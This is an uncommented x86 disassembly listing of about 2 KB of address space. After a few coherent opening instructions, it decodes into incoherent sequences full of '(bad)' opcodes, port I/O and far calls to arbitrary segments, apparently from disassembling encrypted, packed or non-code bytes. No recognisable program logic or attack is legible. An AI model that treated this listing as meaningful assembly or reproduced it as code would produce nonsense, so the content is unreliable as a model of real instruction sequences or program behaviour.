  407a2e:	lea    eax,[ebp-0xc]
  407a31:	mov    DWORD PTR [ebp-0x10],eax
  407a34:	mov    eax,DWORD PTR [ebp-0x10]
  407a37:	mov    edx,DWORD PTR [eax]
  407a39:	jmp    0x407daf
  407a3e:	sub    eax,0xb2df1e8f
  407a43:	imul   ebp,ebp,0x58ddbe5d
  407a49:	or     ch,al
  407a4b:	and    cl,cl
  407a4d:	mov    al,0x29
  407a4f:	aam    0x7c
  407a51:	jl     0x407a2a
  407a53:	jns    0x407ad1
  407a55:	jl     0x4079f2
  407a57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a58:	inc    ebp
  407a59:	and    ch,BYTE PTR [esi+eiz*4+0x46878cae]
  407a60:	call   0xead8:0xc51138b5
  407a67:	les    ecx,FWORD PTR [edx+0x7ff6e9de]
  407a6d:	daa    
  407a6e:	lods   eax,DWORD PTR ds:[esi]
  407a6f:	jnp    0x407a3c
  407a71:	adc    BYTE PTR [eax],al
  407a73:	loope  0x407ab6
  407a75:	dec    ebx
  407a76:	cmp    ecx,esi
  407a78:	in     al,dx
  407a79:	stc    
  407a7a:	adc    cl,0x17
  407a7d:	mov    edi,gs
  407a7f:	ds pop ss
  407a81:	mov    edi,0xe9ef523b
  407a86:	mov    dh,0xb4
  407a88:	int3   
  407a89:	sar    BYTE PTR [edi+0x6db6c815],1
  407a8f:	mov    ebp,DWORD PTR [ebp-0x25c26bfe]
  407a95:	and    ch,dh
  407a97:	out    0xd7,eax
  407a99:	xor    BYTE PTR [ecx+ebx*4],dl
  407a9c:	mov    dl,0x9e
  407a9e:	jge    0x407a76
  407aa0:	or     BYTE PTR [esi+0x1e42a3e],bh
  407aa6:	int    0xd4
  407aa8:	repnz mov bh,ah
  407aab:	and    DWORD PTR [ebp+0x2e],ebx
  407aae:	ja     0x407afb
  407ab0:	mov    edx,DWORD PTR [esi-0x43366286]
  407ab6:	call   0x283f:0xd725c740
  407abd:	jle    0x407abe
  407abf:	sub    DWORD PTR [esi+0x63779164],ebp
  407ac5:	ss jne 0x407a8d
  407ac8:	scas   al,BYTE PTR es:[edi]
  407ac9:	out    0xe1,al
  407acb:	jg     0x407b07
  407acd:	sub    al,0xe
  407acf:	push   ebp
  407ad0:	in     eax,0xa6
  407ad2:	pop    edx
  407ad3:	fs daa 
  407ad5:	ja     0x407ada
  407ad7:	sbb    BYTE PTR [esi-0x2b],bl
  407ada:	addr16 mov ah,0x9d
  407add:	neg    eax
  407adf:	loope  0x407b2c
  407ae1:	pop    ecx
  407ae2:	or     al,0x5b
  407ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae5:	push   ss
  407ae6:	xor    DWORD PTR [esi],edi
  407ae8:	(bad)  
  407ae9:	jge    0x407ac6
  407aeb:	jmp    ebp
  407aed:	mov    esp,0x96d10206
  407af2:	gs pop edx
  407af4:	adc    dl,cl
  407af6:	in     al,dx
  407af7:	ret    0xbba6
  407afa:	dec    ebp
  407afb:	ret    0x65a7
  407afe:	pop    es
  407aff:	(bad)  [esi-0x355e6d95]
  407b05:	mov    eax,0x33fbe8e
  407b0a:	imul   edx,DWORD PTR [edx],0xffffffed
  407b0d:	mov    esi,0xf861529
  407b12:	push   ebp
  407b13:	pushf  
  407b14:	jns    0x407b6b
  407b16:	jo     0x407b06
  407b18:	inc    ebp
  407b19:	scas   eax,DWORD PTR es:[edi]
  407b1a:	adc    ch,BYTE PTR [eax+0x7c612714]
  407b20:	fs mov ch,0x8d
  407b23:	cld    
  407b24:	mov    edi,0x54d13a10
  407b29:	ret    
  407b2a:	iret   
  407b2b:	xchg   ecx,eax
  407b2c:	mov    bl,0xab
  407b2e:	xchg   ecx,edx
  407b30:	shl    eax,1
  407b32:	mov    eax,gs
  407b34:	fsubr  QWORD PTR [edx]
  407b36:	jmp    0x407ba9
  407b38:	pop    ebp
  407b39:	(bad)  
  407b3a:	aas    
  407b3b:	pop    ebp
  407b3c:	arpl   WORD PTR [ebp-0x1723863f],si
  407b42:	shr    BYTE PTR [eax+0x355f0837],0xc6
  407b49:	pop    eax
  407b4a:	mov    al,ds:0x74bcc199
  407b4f:	cmp    DWORD PTR [ecx],ecx
  407b51:	shl    WORD PTR [ecx],0xd7
  407b55:	out    dx,al
  407b56:	loop   0x407ba0
  407b58:	sub    eax,0x3ada79b2
  407b5d:	xchg   edi,eax
  407b5e:	lahf   
  407b5f:	inc    ebp
  407b60:	ss jp  0x407b4a
  407b63:	pop    ebp
  407b64:	mov    eax,0x4789c6e2
  407b69:	mov    eax,ds:0xfca87d0a
  407b6e:	xor    DWORD PTR [edi+eax*4+0x22749a73],0x896b5201
  407b79:	sti    
  407b7a:	cmp    eax,0xef177c67
  407b7f:	or     BYTE PTR [esp+eax*4+0x20],dh
  407b83:	outs   dx,DWORD PTR ds:[esi]
  407b84:	push   eax
  407b85:	cs shl ebp,0xd8
  407b89:	mov    ds,WORD PTR [eax+0x44f90084]
  407b8f:	je     0x407b15
  407b91:	lds    esp,FWORD PTR [esi+edi*1]
  407b94:	cmc    
  407b95:	rol    DWORD PTR [ebx-0x64],1
  407b98:	xor    al,0xdc
  407b9a:	(bad)  
  407b9b:	ins    DWORD PTR es:[edi],dx
  407b9c:	data16 aam 0x4f
  407b9f:	xchg   esp,eax
  407ba0:	cmp    BYTE PTR [edi-0x38c01225],al
  407ba6:	aaa    
  407ba7:	pop    ecx
  407ba8:	(bad)  
  407ba9:	mov    bl,0x93
  407bab:	mov    BYTE PTR ds:0xa2ccb624,dh
  407bb1:	add    ecx,DWORD PTR [edx+0x2f]
  407bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407bb5:	stc    
  407bb6:	nop
  407bb7:	and    BYTE PTR [edx+edi*4],cl
  407bba:	das    
  407bbb:	push   eax
  407bbc:	xchg   ebp,eax
  407bbd:	mov    edx,0x51947e0a
  407bc2:	js     0x407c35
  407bc4:	cmp    BYTE PTR [esi],ch
  407bc6:	push   esi
  407bc7:	gs js  0x407bc0
  407bca:	jecxz  0x407bf3
  407bcc:	dec    esi
  407bcd:	xor    ebx,DWORD PTR [eax]
  407bcf:	jecxz  0x407b61
  407bd1:	cmp    DWORD PTR [edi+edi*4],esi
  407bd4:	pushf  
  407bd5:	mov    edx,0x9acb17bb
  407bda:	adc    BYTE PTR [ebx+0x2514f210],0xef
  407be1:	pop    ecx
  407be2:	in     al,dx
  407be3:	add    al,0xfc
  407be5:	mov    al,ds:0xdf0f6e2b
  407bea:	in     al,dx
  407beb:	inc    edx
  407bec:	in     eax,dx
  407bed:	jbe    0x407bb0
  407bef:	sbb    al,0x18
  407bf1:	aaa    
  407bf2:	xchg   ebx,eax
  407bf3:	mov    cs,WORD PTR [eax+0x784f0758]
  407bf9:	lds    esp,FWORD PTR [edi+0x33]
  407bfc:	mov    al,0x6a
  407bfe:	cmp    ecx,ebp
  407c00:	lods   al,BYTE PTR ds:[esi]
  407c01:	in     eax,dx
  407c02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c03:	mov    ds:0xa5807bb0,eax
  407c08:	div    DWORD PTR [eax]
  407c0a:	cmc    
  407c0b:	adc    ebp,DWORD PTR ds:0xfdc89882
  407c11:	mov    ah,0xe9
  407c13:	(bad)  
  407c14:	xor    esi,edx
  407c16:	fcomip st,st(5)
  407c18:	shr    DWORD PTR [esi-0x62],0x2e
  407c1c:	iret   
  407c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c1e:	cmc    
  407c1f:	add    eax,0xea9c3b92
  407c24:	sar    DWORD PTR [edx+0x4981a2c],1
  407c2a:	push   ds
  407c2b:	call   0xc799e037
  407c30:	stos   DWORD PTR es:[edi],eax
  407c31:	mov    ebp,0x4c35fb61
  407c36:	fst    QWORD PTR [eax-0x2e]
  407c39:	dec    ebp
  407c3a:	(bad)  
  407c3b:	jbe    0x407ca2
  407c3d:	add    BYTE PTR [ebx],ah
  407c3f:	jne    0x407cc0
  407c41:	push   cs
  407c42:	lock push ebp
  407c44:	ins    BYTE PTR es:[edi],dx
  407c45:	les    ebp,FWORD PTR [eax+0xf]
  407c48:	aas    
  407c49:	imul   BYTE PTR [ebx-0x2e44b3b9]
  407c4f:	mov    eax,0xa83da9aa
  407c54:	imul   DWORD PTR [ecx]
  407c56:	adc    dh,BYTE PTR [esi-0x16]
  407c59:	addr16 sar eax,0x6
  407c5d:	out    dx,al
  407c5e:	pushf  
  407c5f:	lods   al,BYTE PTR ds:[esi]
  407c60:	jmp    0x2df1:0x4908e48c
  407c67:	jge    0x407bf9
  407c69:	jl     0x407c6b
  407c6b:	adc    DWORD PTR [ebx],esi
  407c6d:	adc    eax,0x6c84add4
  407c72:	pop    esi
  407c73:	fnstcw WORD PTR [ecx]
  407c75:	push   esp
  407c76:	or     BYTE PTR [ebp-0x2a],ch
  407c79:	and    al,0xd8
  407c7b:	iret   
  407c7c:	out    0x3e,eax
  407c7e:	outs   dx,BYTE PTR ds:[esi]
  407c7f:	shr    ah,0x5b
  407c82:	nop
  407c83:	or     al,0x8f
  407c85:	and    eax,0x6e55bb2d
  407c8a:	jle    0x407c33
  407c8c:	push   ebp
  407c8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c8e:	sbb    eax,edx
  407c90:	jp     0x407cc1
  407c92:	dec    edi
  407c93:	jg     0x407cbd
  407c95:	sar    DWORD PTR [edi+edi*2],0xce
  407c99:	(bad)  
  407c9a:	adc    eax,DWORD PTR [ebp-0x63]
  407c9d:	cmp    dl,dh
  407c9f:	cld    
  407ca0:	push   ecx
  407ca1:	outs   dx,BYTE PTR ds:[esi]
  407ca2:	loopne 0x407c8d
  407ca4:	sub    edi,DWORD PTR [edi-0x22]
  407ca7:	lea    ebx,ds:0xace9ebd9
  407cad:	dec    eax
  407cae:	mov    eax,0x30112d3a
  407cb3:	clc    
  407cb4:	mov    al,ds:0x80ff88cf
  407cb9:	pop    ss
  407cba:	aad    0x6e
  407cbc:	sbb    bh,dl
  407cbe:	stos   BYTE PTR es:[edi],al
  407cbf:	test   al,0x40
  407cc1:	scas   eax,DWORD PTR es:[edi]
  407cc2:	sub    DWORD PTR [esi+0x70102fc5],0xfffffff0
  407cc9:	(bad)  
  407ccb:	add    esp,DWORD PTR [ebp+0x18639394]
  407cd1:	test   al,0x3b
  407cd3:	mov    DWORD PTR [edx-0x3814c753],esi
  407cd9:	int    0x22
  407cdb:	jo     0x407cee
  407cdd:	nop
  407cde:	mov    al,0x14
  407ce0:	mov    dl,BYTE PTR [eax+edx*1+0x41]
  407ce4:	adc    DWORD PTR [ebp+0x43764b67],edx
  407cea:	into   
  407ceb:	repz adc eax,0xa067b99e
  407cf1:	sahf   
  407cf2:	cwde   
  407cf3:	popa   
  407cf4:	test   BYTE PTR [ebx],bl
  407cf6:	jb     0x407d4d
  407cf8:	ja     0x407c8a
  407cfa:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407cfc:	test   eax,0x2a070f57
  407d01:	ds aaa 
  407d03:	mov    edx,0x75d4c103
  407d08:	sub    al,BYTE PTR [esi-0x2d03e8d5]
  407d0e:	jp     0x407d77
  407d10:	dec    edx
  407d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d12:	mov    ds:0x129f5c64,al
  407d17:	shl    BYTE PTR [ebp+0xb7679d9],0x85
  407d1e:	sbb    al,0x3d
  407d20:	inc    ebp
  407d21:	dec    ebx
  407d22:	test   al,0xad
  407d24:	lods   eax,DWORD PTR fs:[esi]
  407d26:	pop    edx
  407d27:	ins    DWORD PTR es:[edi],dx
  407d28:	inc    ecx
  407d29:	xchg   BYTE PTR [eax+0x6ecb5e54],bl
  407d2f:	shl    DWORD PTR [ecx-0x7f04b861],1
  407d35:	mov    edx,0x96c0b9de
  407d3a:	das    
  407d3b:	dec    ecx
  407d3c:	xlat   BYTE PTR ds:[ebx]
  407d3d:	and    esi,DWORD PTR [eax]
  407d3f:	pop    esi
  407d40:	push   0x68
  407d42:	mov    ecx,0xfaf474ba
  407d47:	ror    BYTE PTR [ecx+0x227f7644],1
  407d4d:	lods   eax,DWORD PTR ds:[esi]
  407d4e:	xor    al,0x91
  407d50:	sbb    BYTE PTR [esi],al
  407d52:	and    eax,0x8f8af008
  407d57:	repz mov dl,0x2a
  407d5a:	or     DWORD PTR [edx+0x4e628ed9],edx
  407d60:	jmp    0x407cfc
  407d62:	sbb    ebp,DWORD PTR [edi-0x6b]
  407d65:	in     eax,dx
  407d66:	pushf  
  407d67:	cmc    
  407d68:	lods   al,BYTE PTR ds:[esi]
  407d69:	or     edi,esi
  407d6b:	jbe    0x407d2e
  407d6d:	dec    eax
  407d6e:	fs push 0xc0ca0054
  407d74:	stos   DWORD PTR es:[edi],eax
  407d75:	dec    esi
  407d76:	push   eax
  407d77:	loope  0x407d3d
  407d79:	jle    0x407df1
  407d7b:	add    eax,0x1189f6ff
  407d80:	shr    DWORD PTR [ebx+0x2fa25cf5],cl
  407d86:	call   0x378f:0x4ead98f4
  407d8d:	jmp    0x407db6
  407d8f:	inc    esi
  407d90:	outs   dx,DWORD PTR ds:[esi]
  407d91:	jmp    0x407d13
  407d93:	xor    al,0xc5
  407d95:	push   edi
  407d96:	imul   eax,ebp,0xb5ebc956
  407d9c:	push   ss
  407d9d:	lahf   
  407d9e:	dec    BYTE PTR [edx+0x36b2b22d]
  407da4:	add    DWORD PTR [ecx+0x5d510a81],esi
  407daa:	popf   
  407dab:	push   esi
  407dac:	mov    ebx,0xd2694a0d
  407db1:	call   0x8a391c5f
  407db6:	adc    BYTE PTR [ebx-0x67c20bbb],cl
  407dbc:	xor    BYTE PTR [ebx],dl
  407dbe:	pop    eax
  407dbf:	jmp    0x408135
  407dc4:	cwde   
  407dc5:	mov    eax,ds:0x5b4dbc42
  407dca:	mov    ds:0x4fdb206d,al
  407dcf:	or     bl,BYTE PTR [eax+0x4f]
  407dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407dd3:	fiadd  DWORD PTR [eax-0x2883832f]
  407dd9:	jns    0x407e57
  407ddb:	jl     0x407d96
  407ddd:	and    al,0x26
  407ddf:	push   ebp
  407de0:	sbb    DWORD PTR [ecx-0x23ee409d],ecx
  407de6:	mov    DWORD PTR [edi],0xd3f6a7bb
  407dec:	das    
  407ded:	out    0xe0,al
  407def:	cmp    bl,BYTE PTR [edi-0x2c]
  407df2:	inc    edx
  407df3:	sub    edi,DWORD PTR [ebp+0xc]
  407df6:	and    BYTE PTR [ebp+0x4b],bl
  407df9:	cmc    
  407dfa:	loop   0x407e66
  407dfc:	cli    
  407dfd:	mov    ecx,0x94af88e3
  407e02:	or     ah,BYTE PTR [edx]
  407e04:	rcl    DWORD PTR ds:0x1aa937ed,1
  407e0a:	aam    0x7d
  407e0c:	stos   BYTE PTR es:[edi],al
  407e0d:	aaa    
  407e0e:	xchg   edi,eax
  407e0f:	(bad)  
  407e11:	popa   
  407e12:	mov    esi,0xcf5d259f
  407e17:	ret    0xa42a
  407e1a:	ss jae 0x407e7d
  407e1d:	jnp    0x407e56
  407e1f:	adc    DWORD PTR [edx+0x28],0x2b
  407e23:	das    
  407e24:	out    dx,al
  407e25:	(bad)  
  407e26:	pop    ds
  407e27:	and    esp,DWORD PTR [esi+0x43]
  407e2a:	loopne 0x407e45
  407e2c:	test   al,0x77
  407e2e:	scas   eax,DWORD PTR es:[di]
  407e30:	in     eax,dx
  407e31:	outs   dx,BYTE PTR ds:[esi]
  407e32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e33:	retf   
  407e34:	and    dh,BYTE PTR [edx]
  407e36:	scas   eax,DWORD PTR es:[edi]
  407e37:	inc    BYTE PTR [eax]
  407e39:	pop    edx
  407e3a:	int    0x9e
  407e3c:	mov    ebx,DWORD PTR [ecx]
  407e3e:	xchg   edi,eax
  407e3f:	outs   dx,BYTE PTR ds:[esi]
  407e40:	pop    ecx
  407e41:	retf   0x2240
  407e44:	imul   esi,esp,0xc89e3fff
  407e4a:	jge    0x407dfc
  407e4c:	xchg   esp,eax
  407e4d:	lock fcos 
  407e50:	jp     0x407e53
  407e52:	xor    al,0x54
  407e54:	popf   
  407e55:	pop    ebx
  407e56:	call   0x8529d611
  407e5b:	lods   al,BYTE PTR ds:[esi]
  407e5c:	jmp    DWORD PTR [ebp+0x24]
  407e5f:	xor    al,0xf5
  407e61:	xchg   BYTE PTR [ebp+0x50053293],dh
  407e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e68:	jl     0x407e07
  407e6a:	call   0xd7cd4a57
  407e6f:	mov    ds:0x5872b8da,al
  407e74:	test   DWORD PTR [edi+0x12],esi
  407e77:	mov    ds:0xaa8bfee5,eax
  407e7c:	dec    edx
  407e7d:	jp     0x407e56
  407e7f:	ror    BYTE PTR [ecx+0x29a52b07],cl
  407e85:	push   edx
  407e86:	jmp    0xc995670b
  407e8b:	add    al,0xac
  407e8d:	adc    ebp,esi
  407e8f:	imul   edx,DWORD PTR [eax+0x70],0x8d6202
  407e96:	ds leave 
  407e98:	pop    ss
  407e99:	sbb    BYTE PTR [ebx],cl
  407e9b:	jle    0x407efb
  407e9d:	lods   eax,DWORD PTR ds:[esi]
  407e9e:	mov    BYTE PTR ds:0xd62ab362,cl
  407ea4:	pop    edx
  407ea5:	inc    edx
  407ea6:	sti    
  407ea7:	jns    0x407ec0
  407ea9:	inc    esi
  407eaa:	inc    eax
  407eab:	xlat   BYTE PTR ds:[ebx]
  407eac:	mov    ss,WORD PTR [edx]
  407eae:	ds test al,0xcd
  407eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eb2:	cmp    al,0x4c
  407eb4:	sbb    eax,0x3d1019cb
  407eb9:	sbb    al,BYTE PTR [ecx+0x6a]
  407ebc:	lock jne 0x407e87
  407ebf:	xchg   ecx,eax
  407ec0:	and    edi,0xffffffa3
  407ec3:	imul   ecx,DWORD PTR [edi],0xd3f466c5
  407ec9:	into   
  407eca:	xchg   esp,eax
  407ecb:	inc    esi
  407ecc:	dec    DWORD PTR [esi]
  407ece:	test   al,0xe4
  407ed0:	mov    DWORD PTR [edi],0x4179cd7d
  407ed6:	mov    WORD PTR [edi],ds
  407ed8:	inc    edi
  407ed9:	shl    DWORD PTR [ebp+0x2676f1ac],1
  407edf:	int    0x34
  407ee1:	push   cs
  407ee2:	pop    ebx
  407ee3:	mul    ebx
  407ee5:	mov    al,0x32
  407ee7:	jl     0x407eff
  407ee9:	aaa    
  407eea:	pusha  
  407eeb:	inc    edx
  407eec:	pop    ss
  407eed:	aas    
  407eee:	or     ebx,edi
  407ef0:	sub    BYTE PTR [ebx-0xd],0x6e
  407ef4:	push   esp
  407ef5:	or     dh,BYTE PTR [eax+0x23becc4d]
  407efb:	nop
  407efc:	push   edx
  407efd:	push   ebx
  407efe:	arpl   WORD PTR [edx-0xd],bx
  407f01:	sbb    eax,DWORD PTR [edi]
  407f03:	or     bh,BYTE PTR [edi+0x60]
  407f06:	in     eax,dx
  407f07:	ss push edi
  407f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f0a:	leave  
  407f0b:	fidivr DWORD PTR [esi+0x149de5ca]
  407f11:	mov    bh,0xe9
  407f13:	sub    al,0xbb
  407f15:	mov    edx,0x2d492f0b
  407f1a:	fmulp  st(6),st
  407f1c:	lock shl edi,0xa4
  407f20:	inc    edi
  407f21:	push   edx
  407f22:	jp     0x407eb1
  407f24:	jbe    0x407ec4
  407f26:	or     al,0xc2
  407f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f29:	inc    ecx
  407f2a:	lea    esp,[ebx-0x4c]
  407f2d:	dec    edx
  407f2e:	inc    ecx
  407f2f:	arpl   WORD PTR [ebp-0x66],bp
  407f32:	pop    ebx
  407f33:	adc    ah,BYTE PTR [ebx]
  407f35:	lds    ebx,FWORD PTR [esi-0x2c]
  407f38:	xor    ecx,DWORD PTR [ebp-0x1b0d65c8]
  407f3e:	fsubr  QWORD PTR [ebx-0x2]
  407f41:	mov    gs:0x1429eaa,eax
  407f47:	xor    cl,BYTE PTR [esi+0x66]
  407f4a:	(bad)  
  407f4b:	xor    esp,esi
  407f4d:	cmp    eax,0x8b3b2ca8
  407f52:	dec    esi
  407f53:	dec    edi
  407f54:	push   ebp
  407f55:	lds    eax,FWORD PTR [eax-0x7ea96655]
  407f5b:	dec    ecx
  407f5c:	cld    
  407f5d:	inc    esi
  407f5e:	repz push ecx
  407f60:	popf   
  407f61:	mov    BYTE PTR [ebx],dl
  407f63:	jbe    0x407fe1
  407f65:	add    ebp,edx
  407f67:	push   es
  407f68:	ficom  DWORD PTR [edx]
  407f6a:	ins    DWORD PTR es:[edi],dx
  407f6b:	cmp    al,0x49
  407f6d:	pop    eax
  407f6e:	inc    edx
  407f6f:	shl    DWORD PTR [esi-0x5244ea93],cl
  407f75:	les    ecx,FWORD PTR [ebx]
  407f77:	lods   al,BYTE PTR ds:[esi]
  407f78:	and    BYTE PTR [edx-0x7062e67d],ah
  407f7e:	aad    0x36
  407f80:	dec    eax
  407f81:	test   al,0xc5
  407f83:	push   edx
  407f84:	xor    eax,0xdd2b01b7
  407f89:	sub    al,0xd9
  407f8b:	and    DWORD PTR ds:0xc3184950,ecx
  407f91:	lods   eax,DWORD PTR ds:[esi]
  407f92:	mov    cl,0x19
  407f94:	test   eax,0x67cc9bcc
  407f99:	xrelease xchg BYTE PTR [ebx],bh
  407f9c:	(bad)  
  407f9d:	(bad)  
  407f9e:	xor    cl,bl
  407fa0:	add    al,0x96
  407fa2:	sub    eax,0x5aad53ba
  407fa7:	mov    eax,DWORD PTR [ebp+0x188842bf]
  407fad:	dec    edx
  407fae:	sahf   
  407faf:	imul   edi,DWORD PTR [ebp+ecx*2-0x3dc8017],0xffffffec
  407fb7:	cmp    al,0x1b
  407fb9:	ja     0x407f70
  407fbb:	test   BYTE PTR [esi+0x5cd0dfb2],bl
  407fc1:	jp     0x407f57
  407fc3:	xor    DWORD PTR [ebx+ecx*1-0x341abfc8],edi
  407fca:	(bad)  
  407fcb:	stos   DWORD PTR es:[edi],eax
  407fcc:	xor    edi,edx
  407fce:	sbb    al,0xef
  407fd0:	jl     0x40800b
  407fd2:	(bad)  
  407fd3:	(bad)  
  407fd5:	and    al,0xcd
  407fd7:	xchg   edi,eax
  407fd8:	lock adc DWORD PTR [edi-0x53],ebp
  407fdc:	dec    eax
  407fdd:	iret   
  407fde:	push   esi
  407fdf:	inc    ebp
  407fe0:	dec    eax
  407fe1:	mov    BYTE PTR [edx],dh
  407fe3:	adc    al,cl
  407fe5:	pop    es
  407fe6:	add    dl,BYTE PTR fs:[eax]
  407fe9:	or     eax,0xa14a0f0f
  407fee:	rol    DWORD PTR [ebx+0x59eaa1bb],1
  407ff4:	pop    edx
  407ff5:	test   eax,0x2599290b
  407ffa:	daa    
  407ffb:	(bad)  
  407ffc:	idiv   DWORD PTR [edx+0x6b]
  407fff:	mov    ebp,0x66d232d1
  408004:	and    al,0xc6
  408006:	dec    eax
  408007:	fld    st(3)
  408009:	icebp  
  40800a:	xor    edi,ebp
  40800c:	cld    
  40800d:	test   eax,0x26737cde
  408012:	or     eax,0xa69568ea
  408017:	data16 xchg BYTE PTR [ebx],dl
  40801a:	mov    ds:0xdabc47af,al
  40801f:	mov    esi,0x8ffc4cbd
  408024:	test   eax,0x7b7c4005
  408029:	push   es
  40802a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40802b:	jge    0x408002
  40802d:	outs   dx,BYTE PTR ds:[esi]
  40802e:	scas   eax,DWORD PTR es:[edi]
  40802f:	xchg   ecx,eax
  408030:	adc    bl,0xfe
  408033:	xchg   edi,eax
  408034:	outs   dx,BYTE PTR ds:[esi]
  408035:	call   0x81c9:0x9d41850b
  40803c:	pop    ebp
  40803d:	sti    
  40803e:	push   edx
  40803f:	js     0x407ffd
  408041:	adc    eax,0x6d5ac89c
  408046:	add    ah,BYTE PTR [edx+0x3f]
  408049:	(bad)  
  40804a:	xchg   ecx,eax
  40804b:	mov    esp,cs
  40804d:	ja     0x408047
  40804f:	dec    ebx
  408050:	mov    al,0x2e
  408052:	ds cmc 
  408054:	jmp    0xf2df:0xd4b28c25
  40805b:	stos   BYTE PTR es:[edi],al
  40805c:	xchg   esi,eax
  40805d:	sbb    eax,0x4a8b2ee3
  408062:	inc    edi
  408063:	jp     0x40800c
  408065:	push   0x1c
  408067:	(bad)  
  408068:	mov    bl,0x64
  40806a:	jbe    0x4080e6
  40806c:	js     0x408020
  40806e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40806f:	lds    ebx,FWORD PTR [ebx+ecx*2]
  408072:	push   ebp
  408073:	adc    edx,DWORD PTR [edi+0x2cf8cb69]
  408079:	inc    ebp
  40807a:	les    ebx,FWORD PTR [ecx+esi*2]
  40807d:	test   BYTE PTR [edx],ah
  40807f:	mov    ecx,0xfa667583
  408084:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408085:	sub    BYTE PTR [ebx-0x3e],0x22
  408089:	or     BYTE PTR [eax+0x3844785],al
  40808f:	cmp    eax,ebx
  408091:	push   es
  408092:	lahf   
  408093:	inc    ebp
  408094:	sahf   
  408095:	jle    0x408021
  408097:	sbb    edi,DWORD PTR [edi-0x748709a6]
  40809d:	in     al,dx
  40809e:	push   0xf22b3df3
  4080a3:	stos   DWORD PTR es:[edi],eax
  4080a4:	mov    dh,0xac
  4080a6:	ss arpl bp,si
  4080a9:	dec    esi
  4080aa:	in     eax,0x79
  4080ac:	mov    ds:0x759bf0b,eax
  4080b1:	dec    ebp
  4080b2:	dec    esi
  4080b3:	mov    al,BYTE PTR [edi+ebp*1-0x4e7766be]
  4080ba:	outs   dx,DWORD PTR ds:[esi]
  4080bb:	enter  0xdbc3,0x4c
  4080bf:	xchg   esp,eax
  4080c0:	dec    ecx
  4080c1:	jl     0x40813f
  4080c3:	movnti DWORD PTR ds:0x160ffb68,eax
  4080ca:	(bad)  
  4080cb:	in     eax,dx
  4080cc:	push   ecx
  4080cd:	jno    0x408128
  4080cf:	aaa    
  4080d0:	cli    
  4080d1:	push   ecx
  4080d2:	out    0x4f,eax
  4080d4:	(bad)  
  4080d5:	in     al,dx
  4080d6:	stos   DWORD PTR es:[edi],eax
  4080d7:	mov    ch,0x6b
  4080d9:	lds    esp,FWORD PTR [esi-0x64dcdcb9]
  4080df:	arpl   WORD PTR [eax-0x565580b3],dx
  4080e5:	adc    BYTE PTR [eax+0x3794a394],al
  4080eb:	hlt    
  4080ec:	pop    ss
  4080ed:	inc    eax
  4080ee:	pop    esi
  4080ef:	jne    0x4080a4
  4080f1:	push   esi
  4080f2:	imul   edi,DWORD PTR [eax+0x2c8ee9d5],0xfffffff3
  4080f9:	sqrtps xmm0,XMMWORD PTR [ebp-0x33]
  4080fd:	dec    esi
  4080fe:	adc    al,0xe3
  408100:	stos   DWORD PTR es:[edi],eax
  408101:	mov    ebp,0x13370146
  408106:	xchg   ecx,eax
  408107:	jecxz  0x40817c
  408109:	popf   
  40810a:	pop    edx
  40810b:	cmp    edi,DWORD PTR [edx]
  40810d:	(bad)  
  408110:	cmp    al,BYTE PTR [ebp-0x17bcca85]
  408116:	fwait
  408117:	mov    edx,0x426d0fc9
  40811c:	xor    BYTE PTR [edx+0x29],0xf7
  408120:	ret    
  408121:	mov    bl,0x76
  408123:	add    ah,ch
  408125:	out    0x8c,eax
  408127:	jmp    0x4080d1
  408129:	lods   eax,DWORD PTR ds:[esi]
  40812a:	nop
  40812b:	addr16 call 0xcbb0:0x60faba8d
  408133:	(bad)  
  408135:	je     0x4084c8
  40813b:	mov    eax,DWORD PTR [ebp-0x1c]
  40813e:	or     DWORD PTR [eax],0x60751c98
  408144:	jmp    0x4084ba
  408149:	pop    edx
  40814a:	jns    0x4080ea
  40814c:	fs bound ecx,QWORD PTR gs:[di]
  408151:	add    ebp,ebp
  408153:	push   ebx
  408154:	sbb    eax,DWORD PTR [ebx]
  408156:	mov    BYTE PTR [ebx],al
  408158:	mov    bl,BYTE PTR [ebx-0x2e]
  40815b:	jl     0x4081d9
  40815d:	xlat   BYTE PTR ds:[ebx]
  40815e:	jns    0x4081dc
  408160:	jl     0x40819b
  408162:	push   esp
  408163:	pop    esi
  408164:	add    BYTE PTR [ebp+0x66],ah
  408167:	cmp    DWORD PTR [edx+ecx*8+0x71361f2e],edi
  40816e:	jno    0x4081d3
  408170:	popf   
  408171:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408172:	gs jb  0x408139
  408175:	daa    
  408176:	push   0x9dd2444a
  40817b:	sahf   
  40817c:	ficomp DWORD PTR [edi-0x7ba2c186]
  408182:	push   ecx
  408183:	sbb    edi,DWORD PTR [ecx-0x2c09547f]
  408189:	scas   al,BYTE PTR es:[edi]
  40818a:	lock push edx
  40818c:	jle    0x40818b
  40818e:	jns    0x4081f1
  408190:	add    al,BYTE PTR [edi]
  408192:	xor    dl,BYTE PTR [edx]
  408194:	inc    esp
  408195:	mov    bl,BYTE PTR [edx-0x6b6f1c57]
  40819b:	popa   
  40819c:	sbb    ebx,ebx
  40819e:	and    edi,ebp
  4081a0:	jo     0x408184
  4081a2:	aas    
  4081a3:	dec    esi
  4081a4:	sbb    BYTE PTR [eax-0x1b],bl
  4081a7:	adc    eax,0x14a39028
  4081ac:	mov    DWORD PTR [edi-0x45],edx
  4081af:	push   edx
  4081b0:	mov    dh,0x6
  4081b2:	cmp    BYTE PTR [edi-0x198ee424],bh
  4081b8:	inc    ecx
  4081b9:	shl    BYTE PTR [edx+0x1],1
  4081bc:	pushf  
